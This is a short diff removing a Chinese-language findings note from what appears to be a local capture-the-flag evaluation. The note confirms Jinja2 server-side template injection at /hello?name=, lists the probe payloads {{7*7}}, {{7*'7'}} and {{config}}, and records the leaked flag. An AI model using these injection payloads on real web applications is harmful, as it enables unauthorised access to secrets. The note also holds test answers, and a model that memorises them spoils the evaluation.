@@ -1,7 +1,0 @@
-FOUND_FLAG=flag{local-eval-ssti-c58e12}
-
-已确认：`GET /hello?name={{config}}` 回显 `{'FLAG': 'flag{local-eval-ssti-c58e12'}`（Jinja2 SSTI，逐字取自响应）。
-
-- 已确认：SSTI 点为 `/hello?name=`，`{{7*7}}`→49，`{{7*"7"}}`→7777777
-- 已证伪：`${}`/`#{}`/`<%= %>` 无回显（非 Freemarker/ERB），非路径穿越
-- 还差什么：无
